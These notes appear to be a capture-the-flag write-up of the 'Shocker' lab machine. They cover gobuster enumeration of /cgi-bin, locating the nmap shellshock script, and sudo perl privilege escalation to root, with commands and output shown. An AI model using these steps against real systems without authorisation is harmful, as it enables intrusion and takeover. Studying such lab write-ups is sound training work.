### From the apache version then can search out the ubuntu version -- oops..
```
[https://packages.ubuntu.com](https://packages.ubuntu.com)
```

### find shellshock exploit on kali
```
locate shellshock |grep shellshock
/usr/share/nmap/scripts/http-shellshock.nse
```
  
### gobuster: 
```
sudo gobuster dir --url http://10.10.10.56/ -w /usr/share/wordlists/dirb/common.txt -s 302,307,200,204,301,403 -x sh,pl
```

/cgi-bin is definitely something we want to check out. This is a directory where sysadmins can place scripts to be executed
```
-s: to search for diff response
-x: file extension
```

To search sub-dir: 
```
sudo gobuster dir --url http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 -x sh,pl
```
  
### To check nmap script, e.g.
```
locate nse |grep shellshock 
```
### if see cgi-bin, can try nmap script shellshock

### Once get the shell:
To check if the user able to exec w/o password: 
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l

Matching Defaults entries for shelly on Shocker:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  
User shelly may run the following commands on Shocker:

 (root) NOPASSWD: /usr/bin/perl
```

### Use perl reverse shell to get the root:
```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash"'
sudo perl -e 'exec "/bin/bash"'

whoami
root

wc -c /root/root.txt
33 /root/root.txt
```

